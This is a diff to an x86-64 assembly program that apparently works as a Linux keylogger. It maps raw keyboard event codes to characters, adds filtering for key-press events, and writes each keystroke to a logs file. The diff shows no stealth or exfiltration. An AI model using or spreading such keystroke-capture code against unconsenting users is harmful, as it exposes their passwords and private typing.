@@ -41,9 +41,11 @@ keys:
     .org keys+13
     .byte '='
 
+    # Backspace Key
     .org keys+14
     .byte 0x8
 
+    # Tab Key
     .org keys+15
     .byte 0x9
 
@@ -86,6 +88,7 @@ keys:
     .org keys+28
     .byte '\n'
     
+    # Null Key
     .org keys+29
     .byte 0x0
 
@@ -119,12 +122,15 @@ keys:
     .org keys+39
     .byte ';'
 
+    # ' Key
     .org keys+40
     .byte 0x27
 
+    # ` Key
     .org keys+41
     .byte 0x60
 
+    # Shift-in Key
     .org keys+42
     .byte 0xf
 
@@ -161,6 +167,7 @@ keys:
     .org keys+53
     .byte '/'
 
+    # Shift-in Key
     .org keys+54
     .byte 0xf
 
@@ -170,6 +177,7 @@ keys:
     .org keys+56
     .byte 0x0
 
+    # Space Key
     .org keys+57
     .byte 0x20
 
@@ -213,14 +221,26 @@ main:
         movq $24, %rdx
         syscall
 
+        # Check what is the type of the event
+        movq $buffer, %rbx
+        movq %rbx, %rcx
+        addq $16, %rcx
+        cmpw $1, (%rcx)
+        jne mainLoop
+
+        # Check if the key was pressed or released
+        movq %rbx, %rdx
+        addq $20, %rdx
+        cmpl $1, (%rdx)
+        jne mainLoop
+
         # get the right keyboard key
-        movq $buffer, %rsi
+        movq %rbx, %rsi
         addq $18, %rsi
         movzbq (%rsi), %rsi
         addq $keys, %rsi
 
-        cmpq $0x0, (%rsi)
-        je mainLoop
+        
 
         # write in the logs file
         movq $1, %rax
